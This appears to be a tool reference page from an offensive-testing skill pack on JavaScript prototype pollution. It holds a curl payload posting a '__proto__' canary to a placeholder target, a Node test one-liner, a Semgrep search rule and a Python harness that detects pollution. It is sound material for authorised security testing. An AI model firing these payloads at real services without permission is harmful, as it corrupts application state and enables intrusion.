# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`prototype-pollution`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -H 'Content-Type: application/json' -d '{"__proto__":{"pp_canary":"polluted"}}' 'https://target.example/prefs'` | Submit a prototype-pollution body and then read a reflecting endpoint for the canary | Cross-platform |
| `Node` | `node -e "require('./merge').merge({}, JSON.parse(process.argv[1])); console.log(({}).pp_canary)" '{"__proto__":{"pp_canary":"polluted"}}'` | Exercise a suspected merge helper locally and print whether a fresh object inherits the canary | Cross-platform |
| `Semgrep` | `semgrep -e '$LODASH.merge(...)' -e '$LODASH.set(...)' -l javascript .` | Locate recursive merge and path-set call sites that accept request data | Cross-platform |

## Minimal Script Shape

A pollution canary harness: it posts a __proto__ canary body, then requests a second endpoint and reports whether a default field now carries the canary, which indicates process-wide prototype pollution.

```python
import json
import urllib.request

SINK = "https://target.example/prefs"
READ = "https://target.example/config"
CANARY = "pp_canary"

def post(body):
    data = json.dumps(body).encode()
    req = urllib.request.Request(SINK, data=data, method="POST",
                                headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.status

def read():
    req = urllib.request.Request(READ, headers={"User-Agent": "authorised-assessment"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read().decode("utf-8", "replace")

post({"__proto__": {CANARY: "polluted"}})
leaked = CANARY in read()
print({"canary": CANARY, "reflected_after_pollution": leaked,
       "verdict": "prototype-polluted" if leaked else "no-pollution"})
```
